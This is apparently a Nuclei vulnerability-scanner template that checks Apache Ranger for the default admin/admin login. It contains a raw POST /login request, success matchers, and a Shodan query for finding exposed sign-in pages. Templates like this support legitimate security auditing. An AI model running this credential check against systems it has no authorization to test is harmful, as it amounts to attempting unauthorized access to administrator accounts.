id: ranger-default-login
info:
  name: Apache Ranger - Default Login
  author: For3stCo1d
  severity: high
  description: Apache Ranger contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
  reference:
    - https://github.com/apache/ranger
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:apache:ranger:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Ranger - Sign In"})
    max-request: 1
    product: ranger
    shodan-query: http.title:"Ranger - Sign In"
    vendor: apache
  tags: apache,default-login,ranger,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"statusCode":200'
          - '"msgDesc":"Login Successful"'
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      pass:
        - admin
      user:
        - admin
    raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        username={{user}}&password={{pass}}
